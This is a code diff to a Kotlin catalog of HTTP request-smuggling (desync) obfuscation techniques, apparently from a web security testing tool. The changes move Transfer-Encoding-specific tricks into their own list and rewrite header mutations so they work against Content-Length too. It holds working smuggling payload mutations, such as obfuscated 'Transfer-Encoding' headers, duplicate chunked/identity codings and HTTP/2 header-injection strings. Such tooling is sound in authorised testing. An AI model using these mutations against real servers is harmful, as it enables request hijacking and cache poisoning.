@@ -1,6 +1,7 @@
 package io.bitbytelab.raijin.turbo
 
 import java.io.ByteArrayOutputStream
+import java.util.Base64
 
 /**
  * HTTP request-smuggling / desync obfuscation technique catalog — pure byte/string mutation of
@@ -19,19 +20,27 @@ object DesyncTechniques {
     /** Fixed (non-parameterized) technique names usable against either target header. */
     val SHARED_TECHNIQUES: List<String> = listOf(
         "vanilla", "underjoin1", "spacejoin1", "space1", "nameprefix1", "nameprefix2", "valueprefix1",
-        "vertwrap", "connection", "spjunk", "backslash", "spaceFF", "unispace", "commaCow", "cowComma",
-        "contentEnc", "quoted", "aposed", "dualchunk", "lazygrep", "0dsuffix", "tabsuffix", "revdualchunk",
-        "nested", "encode", "accentTE", "accentCH", "removed", "get", "options", "head", "range",
+        "vertwrap", "connection", "spjunk", "backslash", "spaceFF", "unispace", "quoted", "aposed",
+        "0dsuffix", "tabsuffix", "encode", "accentTE", "removed", "get", "options", "head", "range",
         "qencode", "qencodeutf", "nel", "nbsp", "shy", "shy2",
     )
 
-    /** Transfer-Encoding/HTTP-1-specific technique names. */
+    /**
+     * Transfer-Encoding-specific technique names. Each plays on transfer codings themselves (an
+     * `identity` list or duplicate, a truncated or accented `chunked`, Content-Encoding), which
+     * Content-Length has no counterpart for, so against Content-Length they have no effect.
+     */
+    val TE_TECHNIQUES: List<String> = listOf(
+        "commaCow", "cowComma", "contentEnc", "dualchunk", "lazygrep", "revdualchunk", "nested", "accentCH",
+    )
+
+    /** HTTP/1-specific technique names, usable against either target header. */
     val H1_TECHNIQUES: List<String> = listOf(
         "nospace1", "linewrapped1", "doublewrapped", "gareth1", "badsetupCR", "badsetupLF", "multiCase",
         "tabwrap", "UPPERCASE", "0dwrap", "0dspam", "badwrap", "bodysplit", "h1case", "http1.0",
     )
 
-    /** HTTP/2-specific technique names. */
+    /** HTTP/2-specific technique names, usable against either target header. */
     val H2_TECHNIQUES: List<String> = listOf(
         "http2hide", "h2colon", "h2auth", "h2path", "http2case", "h2scheme", "h2name", "h2method",
         "h2space", "h2prefix", "h2CL",
@@ -49,7 +58,7 @@ object DesyncTechniques {
     fun allTechniques(): List<String> {
         val parameterized = listOf("spacefix1", "prefix1", "suffix1", "namesuffix1")
             .flatMap { base -> SPECIAL_CHARS.map { "$base:$it" } }
-        return SHARED_TECHNIQUES + H1_TECHNIQUES + H2_TECHNIQUES + CL_TECHNIQUES + parameterized
+        return SHARED_TECHNIQUES + TE_TECHNIQUES + H1_TECHNIQUES + H2_TECHNIQUES + CL_TECHNIQUES + parameterized
     }
 
     /** String convenience overload of [apply] (ISO-8859-1), for callers — e.g. Jython scripts — that work with plain text requests rather than byte arrays. */
@@ -62,8 +71,9 @@ object DesyncTechniques {
     /**
      * Applies [technique] to [header] (`"Content-Length"` or `"Transfer-Encoding"`) in [request].
      * Returns the mutated request, or null when [header] is `"Content-Length"` and the technique
-     * had no effect (an ineffective CL technique isn't worth sending; for Transfer-Encoding a
-     * no-effect technique is still returned — matching upstream exactly).
+     * had no effect (a [TE_TECHNIQUES] entry, or a request it does not match: an ineffective CL
+     * technique isn't worth sending; for Transfer-Encoding a no-effect technique is still returned,
+     * matching upstream exactly).
      */
     @JvmStatic
     fun apply(request: ByteArray, header: String, technique: String): ByteArray? {
@@ -172,39 +182,50 @@ object DesyncTechniques {
             }
         }
 
+        // Phrased in terms of the target header's own name and value, so each works against either
+        // header; against Transfer-Encoding every one produces upstream's bytes exactly.
+        val target = headerLine + value
+        transformed = when (technique) {
+            "quoted" -> replaceAll(request, target, "$headerLine\"$value\"")
+            "aposed" -> replaceAll(request, target, "$headerLine'$value'")
+            "encode" -> replaceAll(request, target, "${percentEncodeAfterHyphen(header)}: $value")
+            "accentTE" -> replaceAll(request, Utils.stringToBytes(headerLine), accentFirstE(headerLine))
+            "qencode" -> replaceAll(request, target, headerLine + encodedWord("iso-8859-1", value))
+            "qencodeutf" -> replaceAll(request, target, headerLine + encodedWord("UTF-8", value))
+            "bodysplit" -> {
+                var t = replaceAll(request, target, "X: y")
+                t = addOrReplaceHeader(t, "Foo", "barzxaazz")
+                replaceAll(t, "barzxaazz", "barn\n\n$target")
+            }
+            "http2hide" -> replaceAll(request, target, "Foo: b^~$target^~x: x")
+            "h2colon" -> replaceAll(request, target, "${header}`${value} : $value")
+            "http2case" -> {
+                // HTTP/2 wants lower-case names: every other name is lowered so that only the target
+                // carries an upper-case letter. Upstream lowered the whole request (request line and
+                // body too) and then searched for the capitalised name, so it never matched.
+                val lowered = lowercaseHeaderNames(request)
+                val cased = replaceAll(
+                    lowered, "${header.lowercase()}: $value",
+                    "x-reject: 1\r\n${header.replaceFirstChar { it.lowercaseChar() }}: $value",
+                )
+                if (cased.contentEquals(lowered)) request else cased
+            }
+            "h2name" -> replaceAll(request, target, "${header}`${value}^~xz: x")
+            "h2space" -> replaceAll(request, target, "$header $value : $value")
+            "h1case" -> replaceAll(request, target, headerLine.uppercase() + value)
+            "h2prefix" -> replaceAll(request, target, ":${header.lowercase()}: $value")
+            else -> transformed
+        }
+
         if (header == "Transfer-Encoding") {
             transformed = when (technique) {
                 "commaCow" -> replaceAll(request, "Transfer-Encoding: chunked", "Transfer-Encoding: chunked, identity")
                 "cowComma" -> replaceAll(request, "Transfer-Encoding: ", "Transfer-Encoding: identity, ")
                 "contentEnc" -> replaceAll(request, "Transfer-Encoding: ", "Content-Encoding: ")
-                "quoted" -> replaceAll(request, "Transfer-Encoding: chunked", "Transfer-Encoding: \"chunked\"")
-                "aposed" -> replaceAll(request, "Transfer-Encoding: chunked", "Transfer-Encoding: 'chunked'")
                 "dualchunk" -> addOrReplaceHeader(request, "Transfer-encoding", "identity")
                 "lazygrep" -> replaceAll(request, "Transfer-Encoding: chunked", "Transfer-Encoding: chunk")
                 "revdualchunk" -> replaceAll(request, "Transfer-Encoding: chunked", "Transfer-Encoding: identity\r\nTransfer-Encoding: chunked")
-                "bodysplit" -> {
-                    var t = replaceAll(request, "Transfer-Encoding: chunked", "X: y")
-                    t = addOrReplaceHeader(t, "Foo", "barzxaazz")
-                    replaceAll(t, "barzxaazz", "barn\n\nTransfer-Encoding: chunked")
-                }
                 "nested" -> replaceAll(request, "Transfer-Encoding: chunked", "Transfer-Encoding: identity, chunked, identity")
-                "http2hide" -> replaceAll(request, "Transfer-Encoding: chunked", "Foo: b^~Transfer-Encoding: chunked^~x: x")
-                "encode" -> replaceAll(request, "Transfer-Encoding: chunked", "Transfer-%45ncoding: chunked")
-                "h2colon" -> replaceAll(request, "Transfer-Encoding: chunked", "Transfer-Encoding`chunked : chunked")
-                "http2case" -> {
-                    val lowered = Utils.stringToBytes(Utils.bytesToString(request).lowercase())
-                    replaceAll(lowered, headerLine + value, "x-reject: 1\r\ntransfer-Encoding: chunked")
-                }
-                "h2name" -> replaceAll(request, headerLine + value, "Transfer-Encoding`chunked^~xz: x")
-                "h2space" -> replaceAll(request, headerLine + value, "Transfer-Encoding chunked : chunked")
-                "h1case" -> replaceAll(request, headerLine + value, headerLine.uppercase() + value)
-                "h2prefix" -> replaceAll(request, headerLine + value, ":transfer-encoding: chunked")
-                "qencode" -> replaceAll(request, "Transfer-Encoding: chunked", "Transfer-Encoding: =?iso-8859-1?B?Y2h1bmtlZA==?=")
-                "qencodeutf" -> replaceAll(request, "Transfer-Encoding: chunked", "Transfer-Encoding: =?UTF-8?B?Y2h1bmtlZA==?=")
-                "accentTE" -> replaceAll(
-                    request, Utils.stringToBytes(headerLine),
-                    Utils.stringToBytes("Transf") + 0x82.toByte() + Utils.stringToBytes("r-Encoding: "),
-                )
                 "accentCH" -> replaceAll(
                     request, Utils.stringToBytes("Transfer-Encoding: chu"),
                     Utils.stringToBytes("Transfer-Encoding: ch") + 0x96.toByte(),
@@ -309,4 +330,31 @@ object DesyncTechniques {
         if (secondSpace < 0) return ""
         return text.substring(firstSpace + 1, secondSpace)
     }
+
+    /** Lower-cases every header name, leaving the request line, the values and the body as they were. */
+    private fun lowercaseHeaderNames(request: ByteArray): ByteArray {
+        val text = Utils.bytesToString(request)
+        val headerEnd = text.indexOf("\r\n\r\n").let { if (it < 0) text.length else it }
+        val lines = text.substring(0, headerEnd).split("\r\n").mapIndexed { index, line ->
+            val colon = line.indexOf(':')
+            if (index == 0 || colon < 0) line else line.substring(0, colon).lowercase() + line.substring(colon)
+        }
+        return Utils.stringToBytes(lines.joinToString("\r\n") + text.substring(headerEnd))
+    }
+
+    /** [name] with the letter after its hyphen percent-encoded: `Transfer-%45ncoding`, `Content-%4Cength`. */
+    private fun percentEncodeAfterHyphen(name: String): String {
+        val at = name.indexOf('-') + 1
+        return name.substring(0, at) + "%" + "%02X".format(name[at].code) + name.substring(at + 1)
+    }
+
+    /** [headerLine] with its first `e` swapped for byte 0x82 (`é` in code page 437): `Transf\x82r-Encoding: `. */
+    private fun accentFirstE(headerLine: String): ByteArray {
+        val at = headerLine.indexOf('e')
+        return Utils.stringToBytes(headerLine.substring(0, at)) + 0x82.toByte() + Utils.stringToBytes(headerLine.substring(at + 1))
+    }
+
+    /** [value] as an RFC 2047 base64 encoded-word: `=?iso-8859-1?B?Y2h1bmtlZA==?=` for `chunked`. */
+    private fun encodedWord(charset: String, value: String): String =
+        "=?$charset?B?${Base64.getEncoder().encodeToString(Utils.stringToBytes(value))}?="
 }
